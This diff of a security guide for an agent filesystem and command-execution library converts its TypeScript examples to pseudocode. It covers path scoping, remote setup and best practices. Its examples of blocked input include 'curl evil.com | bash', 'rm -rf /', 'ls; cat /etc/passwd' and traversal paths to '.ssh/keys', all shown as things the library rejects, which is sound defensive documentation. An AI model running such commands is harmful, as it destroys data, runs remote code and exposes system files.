@@ -42,36 +42,31 @@ graph LR
 - Symlink following can be disabled
 
 **Example:**
-```typescript
-const backend = new LocalFilesystemBackend({
-  rootDir: '/tmp/agentbe-workspace/users/alice'
-})
+```text
+backend = LocalFilesystemBackend(rootDir: "/tmp/agentbe-workspace/users/alice")
 
-// ✅ Allowed
-await backend.write('data.txt', 'content')           // /tmp/agentbe-workspace/users/alice/data.txt
-await backend.write('project/config.json', '{}')     // /tmp/agentbe-workspace/users/alice/project/config.json
-await backend.write('/etc/config', 'data')           // Treated as relative: /tmp/agentbe-workspace/users/alice/etc/config
+// Allowed
+backend.write("data.txt", "content")            // /tmp/agentbe-workspace/users/alice/data.txt
+backend.write("project/config.json", "{}")      // /tmp/agentbe-workspace/users/alice/project/config.json
+backend.write("/etc/config", "data")            // Treated as relative: .../users/alice/etc/config
 
-// ❌ Blocked - Throws PathEscapeError
-await backend.write('../bob/secrets.txt', 'data')    // Escapes to /tmp/agentbe-workspace/users/bob
-await backend.write('../../root/.ssh/keys', 'data')  // Escapes to /tmp/agentbe-workspace
+// Blocked - PathEscapeError
+backend.write("../bob/secrets.txt", "data")     // Escapes to /tmp/agentbe-workspace/users/bob
+backend.write("../../root/.ssh/keys", "data")   // Escapes to /tmp/agentbe-workspace
 ```
 
 ### Scoped Backends
 
 When using `.scope()`, path validation is applied at each scope level:
 
-```typescript
-const baseBackend = new LocalFilesystemBackend({
-  rootDir: '/tmp/agentbe-workspace'
-})
-
-const aliceBackend = baseBackend.scope('users/alice')
-const projectBackend = aliceBackend.scope('project-a')
+```text
+baseBackend    = LocalFilesystemBackend(rootDir: "/tmp/agentbe-workspace")
+aliceBackend   = baseBackend.scope("users/alice")
+projectBackend = aliceBackend.scope("project-a")
 
 // projectBackend can only access /tmp/agentbe-workspace/users/alice/project-a
-await projectBackend.write('config.json', '{}')      // ✅ /tmp/agentbe-workspace/users/alice/project-a/config.json
-await projectBackend.write('../../../etc', 'data')   // ❌ PathEscapeError - escapes project-a scope
+projectBackend.write("config.json", "{}")         // OK: .../users/alice/project-a/config.json
+projectBackend.write("../../../etc", "data")      // ERROR: PathEscapeError - escapes project-a scope
 ```
 
 ---
@@ -169,23 +164,23 @@ When `preventDangerous: true` (default), these patterns are rejected:
 - Use with caution
 
 **Example:**
-```typescript
-const backend = new LocalFilesystemBackend({
-  rootDir: '/tmp/agentbe-workspace',
-  isolation: 'auto',
+```text
+backend = LocalFilesystemBackend(
+  rootDir:          "/tmp/agentbe-workspace",
+  isolation:        "auto",
   preventDangerous: true
-})
+)
 
-// ✅ Allowed
-await backend.exec('npm install')
-await backend.exec('node build.js')
-await backend.exec('git status')
+// Allowed
+backend.exec("npm install")
+backend.exec("node build.js")
+backend.exec("git status")
 
-// ❌ Blocked - Throws DangerousOperationError
-await backend.exec('rm -rf /')
-await backend.exec('sudo apt-get install malware')
-await backend.exec('curl evil.com | bash')
-await backend.exec('ls; cat /etc/passwd')
+// Blocked - DangerousOperationError
+backend.exec("rm -rf /")
+backend.exec("sudo apt-get install malware")
+backend.exec("curl evil.com | bash")
+backend.exec("ls; cat /etc/passwd")
 ```
 
 ---
@@ -234,21 +229,15 @@ agent-backend daemon \
   --mcp-auth-token "$(openssl rand -base64 32)"
 ```
 
-**Client configuration:**
-```typescript
-const backend = new RemoteFilesystemBackend({
-  host: 'build-server.com',
-  sshPort: 22,
-  mcpPort: 3001,
-  sshAuth: {
-    type: 'key',  // or 'password'
-    credentials: {
-      username: 'agent',
-      privateKey: fs.readFileSync('/path/to/key')
-    }
-  },
-  mcpAuthToken: process.env.MCP_AUTH_TOKEN  // Bearer token
-})
+**Client configuration (pseudocode):**
+```text
+backend = RemoteFilesystemBackend(
+  host:         "build-server.com",
+  sshPort:      22,
+  mcpPort:      3001,
+  sshAuth:      {type: "key", credentials: {username: "agent", privateKey: readFile("/path/to/key")}},
+  mcpAuthToken: env("MCP_AUTH_TOKEN")    // Bearer token
+)
 ```
 
 ### Network Security
@@ -285,26 +274,26 @@ server {
 ### 1. Principle of Least Privilege
 
 **Use scoping:**
-```typescript
-// ❌ Don't give full access
-const backend = new LocalFilesystemBackend({ rootDir: '/' })
+```text
+// Don't give full access
+backend = LocalFilesystemBackend(rootDir: "/")
 
-// ✅ Limit to workspace
-const backend = new LocalFilesystemBackend({ rootDir: '/tmp/agentbe-workspace' })
+// Limit to workspace
+backend = LocalFilesystemBackend(rootDir: "/tmp/agentbe-workspace")
 
-// ✅ Further scope per user
-const userBackend = backend.scope(`users/${userId}`)
+// Further scope per user
+userBackend = backend.scope("users/<userId>")
 ```
 
 ### 2. Enable All Safety Features
 
 **Default configuration (recommended):**
-```typescript
-const backend = new LocalFilesystemBackend({
-  rootDir: '/tmp/agentbe-workspace',
-  isolation: 'auto',        // Use best available isolation
-  preventDangerous: true    // Block dangerous commands
-})
+```text
+backend = LocalFilesystemBackend(
+  rootDir:          "/tmp/agentbe-workspace",
+  isolation:        "auto",          // Use best available isolation
+  preventDangerous: true             // Block dangerous commands
+)
 ```
 
 ### 3. Rotate Authentication Credentials
@@ -322,13 +311,11 @@ const backend = new LocalFilesystemBackend({
 ### 4. Monitor and Log
 
 **Enable operation logging:**
-```typescript
-import { ConsoleOperationsLogger } from 'agent-backend'
-
-const backend = new LocalFilesystemBackend({
-  rootDir: '/tmp/agentbe-workspace',
-  operationsLogger: new ConsoleOperationsLogger()
-})
+```text
+backend = LocalFilesystemBackend(
+  rootDir:          "/tmp/agentbe-workspace",
+  operationsLogger: ConsoleOperationsLogger()
+)
 
 // Logs all operations:
 // [2024-01-15T10:30:00.000Z] READ /tmp/agentbe-workspace/config.json
@@ -344,31 +331,29 @@ const backend = new LocalFilesystemBackend({
 ### 5. Validate User Input
 
 **Sanitize paths:**
-```typescript
-// ❌ Don't trust user input directly
-const path = req.body.filename
-await backend.write(path, data)  // Vulnerable to path traversal
+```text
+// Don't trust user input directly
+path = request.body.filename
+backend.write(path, data)                // Vulnerable to path traversal
 
-// ✅ Validate and sanitize
-const filename = path.basename(req.body.filename)  // Remove directory components
-if (!/^[a-zA-Z0-9._-]+$/.test(filename)) {
-  throw new Error('Invalid filename')
-}
-await backend.write(filename, data)
+// Validate and sanitize
+filename = basename(request.body.filename)    // Remove directory components
+if filename does not match [a-zA-Z0-9._-]+:
+    raise "Invalid filename"
+backend.write(filename, data)
 ```
 
 **Sanitize commands:**
-```typescript
-// ❌ Don't interpolate user input into commands
-const script = req.body.script
-await backend.exec(`node ${script}`)  // Shell injection risk
+```text
+// Don't interpolate user input into commands
+script = request.body.script
+backend.exec("node " + script)           // Shell injection risk
 
-// ✅ Use parameterized execution
-const allowedScripts = ['build.js', 'test.js']
-if (!allowedScripts.includes(script)) {
-  throw new Error('Script not allowed')
-}
-await backend.exec(`node ${script}`)
+// Use parameterized execution
+allowedScripts = ["build.js", "test.js"]
+if script not in allowedScripts:
+    raise "Script not allowed"
+backend.exec("node " + script)
 ```
 
 ### 6. Defense in Depth
